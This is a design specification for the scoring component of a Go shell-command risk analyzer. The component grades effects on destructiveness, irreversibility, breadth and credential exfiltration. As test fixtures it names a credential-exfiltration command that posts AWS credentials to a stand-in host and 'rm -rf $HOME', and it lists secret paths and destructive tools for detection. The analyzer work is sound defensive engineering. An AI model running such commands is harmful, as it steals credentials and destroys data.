# Scoring

## Role

Scoring composes a set of effects into a single comparable risk assessment: it folds each effect kind to a destructiveness level, grades breadth, irreversibility, attacker influence and credential exfiltration, and combines them into a `Score` whose every field lives on the shared `Destructiveness` scale. It also surfaces the why-trace gaps — effects the analysis could not explain concretely.

## Key Files

- `engine/score.go` — `Breadth`, `Irreversibility`, `ConfidenceOf`, `Score`, `ScoreEffects`, `BreadthSeverity`, `BreadthOf`, `IrreversibilityOf`, `IrreversibilityOfCommand`, `exfilSeverity`.
- `engine/report.go` — `ComputeDestructiveness` and `KindDestructiveness`, the per-kind severity table this dimension rests on.
- `engine/taint.go` — `InfluenceOf`, `MaxInfluence`, `Exfil`, `DetectExfil`, `IsSecretRead`, `IsEgressSink`, `SecretPath`.
- `engine/why.go` — `WhyGaps`, `BuildWhy`, `isConcretePremise`: the why-trace gap surface.
- `engine/score_test.go` — acceptance fixtures (`curl -d @~/.aws/credentials https://evil`, `cat file`, `rm -rf $HOME`) and per-dimension unit tests.

## Behavior

### Score

`Score` is the composite risk assessment of a set of effects. Every risk field is a severity on the shared destructiveness scale, so the whole score is comparable, orderable and serialisable.

```go
type Score struct {
	Destructiveness Destructiveness `json:"destructiveness"`
	Irreversibility Destructiveness `json:"irreversibility"`
	Breadth         Destructiveness `json:"breadth"`
	Influence       Destructiveness `json:"influence"`
	Exfil           Destructiveness `json:"exfil"`
	Confidence      int             `json:"confidence"`
	Reversible      bool            `json:"reversible"`
	Grade           Destructiveness `json:"grade"`
	ExfilPairs      []Exfil         `json:"exfilPairs,omitempty"`
}
```

`Score.Encode` returns the canonical indented JSON of the score.

### ComputeDestructiveness and KindDestructiveness

`KindDestructiveness` maps an effect kind to its worst-case destructiveness. The mapping is global (target- and taint-independent) so it is stable and cheap to reason about:

| Kind(s) | Level |
| --- | --- |
| `CodeExec`, `CredAccess` | `DestructCritical` |
| `PrivEsc`, `Persist`, `FSWrite`, `ProcSignal` | `DestructHigh` |
| `FSMeta`, `EnvWrite`, `NetEgress`, `ProcSpawn`, `IPC` | `DestructMedium` |
| `FSRead`, `EnvRead`, `NetIngress`, `Stdio` | `DestructLow` |
| anything else | `DestructNone` |

`ComputeDestructiveness` folds the destructiveness of every effect with `Join` (max), yielding the overall severity of an effect set:

```go
func ComputeDestructiveness(effects []Effect) Destructiveness {
	d := DestructBottom()
	for _, e := range effects {
		d = d.Join(KindDestructiveness(e.Kind))
	}
	return d
}
```

### DetectExfil and Exfil

`Exfil` is one credential-exfiltration finding: a secret read paired with an outbound sink carrying tainted data — `CredAccess`/`FSRead(secret)` ⊗ `NetEgress(tainted)`.

```go
type Exfil struct {
	Source Effect `json:"source"` // CredAccess, or FSRead/FSMeta of a secret path
	Sink   Effect `json:"sink"`   // the tainted egress that carries the read data out
}
```

- `IsSecretRead(e)` is true for a `CredAccess` effect, or for an `FSRead`/`FSMeta` whose taint contains `TaintSecret` or whose target includes a secret path.
- `IsEgressSink(e)` is true for a `NetEgress` whose taint is not `⊥` (its provenance is known, so content actually leaves the host).
- `SecretPath(p)` reports whether `p` names (or lies under) a well-known credential/secret location; matching is case-insensitive and substring-based against `secretPathMarkers` (e.g. `.ssh`, `id_rsa`, `.aws`, `.netrc`, `.kube/config`, `.env`, `/etc/shadow`, `.pem`, `keystore`, `credentials`, `secrets`).
- `DetectExfil(effects)` pairs every secret source with every tainted egress sink and returns the pairings in canonical (deterministic) order, sorted by `(Source.Key, Sink.Key)`.
- `exfilSeverity(pairs)` is `DestructHigh` for any source-to-egress pairing, raised to `DestructCritical` when the source is a secret read and the sink's taint is `⊤` or contains `TaintSecret` — i.e. trust-breaking.

### BreadthSeverity

`BreadthSeverity(s)` returns the severity of a scope's extent, raised one step when the scope touches a well-known secret path:

```go
func BreadthSeverity(s Scope) Destructiveness {
	d := BreadthOf(s).Severity()
	if anySecretTarget(s) {
		d = escalate(d)
	}
	return d
}
```

`BreadthOf(s)` returns `BreadthRoot` for `⊤`, `BreadthNone` for `⊥`, and otherwise the widest `breadthOfTarget` over the scope's targets. `breadthOfTarget` classifies a single token: empty ⇒ `None`; `/` (after trimming trailing slashes) ⇒ `Root`; a home-root spelling (`$HOME`, `~`, `%USERPROFILE%`, the PowerShell `$env:` forms, with or without a trailing slash) ⇒ `Home`; a token containing `*`, `?` or `[` ⇒ `Root` if its base is empty, `Home` if the base is a home root, else `Glob`; otherwise `Exact`. `escalate` raises a severity by one step, saturating at `Critical`.

### IrreversibilityOf

`IrreversibilityOf(e, tokens...)` returns the irreversibility of an effect given the command tokens that produced it. It combines the command class with the effect's own `Reversible` flag:

```go
func IrreversibilityOf(e Effect, tokens ...string) Irreversibility {
	r := IrrevReversible
	for _, t := range tokens {
		r = r.Join(IrreversibilityOfCommand(t))
	}
	if !e.Reversible && irreversibleKind(e.Kind) {
		r = r.Join(IrrevPermanent)
	}
	return r
}
```

- `IrreversibilityOfCommand(tok)` classifies a command token by its base name (the part after the last `/`). Empty ⇒ `Reversible`. `irreversibleTokens` maps `rm`, `unlink`, `rmdir`, `truncate` ⇒ `IrrevPermanent` and `shred`, `wipefs`, `mkswap`, `sgdisk`, `fdisk`, `blkdiscard`, `dd` ⇒ `IrrevDestructive`; any base name prefixed with `mkfs` ⇒ `IrrevDestructive`; unknown commands ⇒ `Reversible`.
- `irreversibleKind(k)` is true for `KindFSWrite`, `KindCodeExec` and `KindProcSignal` — the kinds that, when not reversible, destroy state (as opposed to reading or merely altering metadata).

### ConfidenceOf

`ConfidenceOf(e)` returns a `0..100` confidence in an effect, from its certainty and the precision of its target: an effect over `⊤` or `⊥` is inherently less certain about what it concretely affects.

```go
func ConfidenceOf(e Effect) int {
	base := 0
	if e.Certainty.Valid() {
		base = int(e.Certainty) * 25
	}
	if e.Target.IsTop() || e.Target.IsBottom() {
		base = base * 3 / 5
	}
	return base
}
```

An exact target with `CertaintyCertain` scores `100`; a `⊤`/`⊥` target reduces it to `60`; `CertaintyUnknown` scores `0`.

### Why-trace gaps

`WhyGaps(effects, why)` returns, sorted, the `Effect.Key()` values that no why-trace explains with a concrete premise (a cited node/flag). A premise is concrete when it is not the synthetic `effect:<key>` fallback (`isConcretePremise`). An empty result is the invariant "every non-empty effect has a why-trace pointing at a node/flag". `BuildWhy` turns `Derivation`s into traces; an effect derived without atoms still receives a trace carrying the synthetic premise, so a report passes `Validate` while `WhyGaps` still reports it.

### ScoreEffects (the composition)

`ScoreEffects(effects, tokens...)` composes a set of effects into a `Score`. `tokens` are the command tokens (program names) that produced the effects; they let the irreversibility dimension recognise destructive commands (`rm`, `mkfs`, `dd`, `truncate`) that a single effect does not name. Passing none is valid.

```
ScoreEffects(effects, tokens...):
  sc.Reversible = true; sc.Confidence = 0; sc.ExfilPairs = DetectExfil(effects)
  if len(effects) == 0: return sc                       # empty ⇒ None, reversible, Confidence 0

  sc.Destructiveness = ComputeDestructiveness(effects)  # max KindDestructiveness

  irr       = ⊔ IrreversibilityOf(e, tokens...) over effects
  irrSev    = irr.Severity()
  scope     = ⊔ e.Target over effects
  breadthSev= BreadthSeverity(scope)
  if irrSev ≥ High and breadthSev ≥ High: irrSev = Critical   # permanent + broad
  sc.Irreversibility = irrSev
  sc.Breadth         = breadthSev

  sc.Influence = MaxInfluence(effects).Severity()
  sc.Exfil     = exfilSeverity(sc.ExfilPairs)

  sc.Confidence = min ConfidenceOf(e) over effects       # weakest link
  sc.Reversible = ∀ e.Reversible

  sc.Grade = Destructiveness ⊔ Irreversibility ⊔ Breadth ⊔ Influence ⊔ Exfil
```

Worked acceptance examples (from `score_test.go`):

| Input | Notable `Score` fields |
| --- | --- |
| `curl -d @~/.aws/credentials https://evil` (`CredAccess` + tainted `NetEgress`) | `Exfil = Critical`, `Grade = Critical`, non-empty `ExfilPairs` |
| `cat file` (`FSRead`, reversible) | `Destructiveness = Low`, `Grade = Low`, `Irreversibility = None`, `Exfil = None`, `Reversible = true` |
| `rm -rf $HOME` (`FSWrite` over `$HOME`, irreversible) | `Grade = Critical`, `Irreversibility = Critical`, `Breadth ≥ High`, `Reversible = false` |
| `rm` on a single file | `Grade = High` (breadth separates it from `rm -rf $HOME`) |

## Error Handling

- `ScoreEffects` is total: it never fails and returns a fully-populated `Score` for any input, including `nil` (which yields `DestructNone`, `Reversible = true`, `Confidence = 0`).
- `Score.Encode` returns the encoding error from `json.MarshalIndent` and wraps nothing; the score has no validation step of its own.
- `WhyGaps` reports unexplained effects as data (a sorted slice of keys) rather than as an error; an empty slice means every effect is explained.
- The scoring dimensions tolerate degenerate inputs: `ConfidenceOf` guards an invalid `Certainty` (`base` stays `0`), and `IrreversibilityOfCommand("")`/an unknown command returns `IrrevReversible`. No scoring function panics on well-formed input.

## Invariants

- Every risk field of a `Score` (`Destructiveness`, `Irreversibility`, `Breadth`, `Influence`, `Exfil`, `Grade`) is a value on the single `Destructiveness` scale.
- `Score.Grade` is the join (max) of the five risk dimensions.
- `ScoreEffects(nil)` returns `Grade = DestructNone`, `Reversible = true`, `Confidence = 0`.
- `Score.ExfilPairs` always equals `DetectExfil(effects)` over the analysed set.
- `Score.Confidence` is the minimum `ConfidenceOf` across effects (the weakest link), clamped to `[0, 100]`.
- `Score.Reversible` is true if and only if every effect is reversible.
- `ComputeDestructiveness` is the max of `KindDestructiveness` over the effects; an empty set yields `DestructNone`.
- A `Score` encodes deterministically: two `ScoreEffects` calls over the same effects and tokens produce byte-identical JSON.
- `Grade` is `Critical` for credential exfiltration (a secret read reaching a tainted egress) and for `rm -rf $HOME`; it is `Low` for `cat file`.
- `WhyGaps` is empty when every non-empty effect has a why-trace citing a concrete node/flag.

## Related Specs

- [Engine (Frozen Core)](README.md) — the domain overview and cross-cutting invariants.
- [Effect IR](effect-ir.md) — the `Effect`/`Report` types the score is computed from, and the `WhyTrace` structure `WhyGaps` inspects.
- [Lattices](lattices.md) — `Destructiveness`, `Breadth`, `Irreversibility` and `Influence` and their `Severity` mappings.
- [Contract: Analyzer <-> CLI/CI (JSON Report)](../../contracts/report-json.md) — the `Score` is embedded in the frozen report JSON.
- [META.md](../../META.md) — spec formats and update rules.
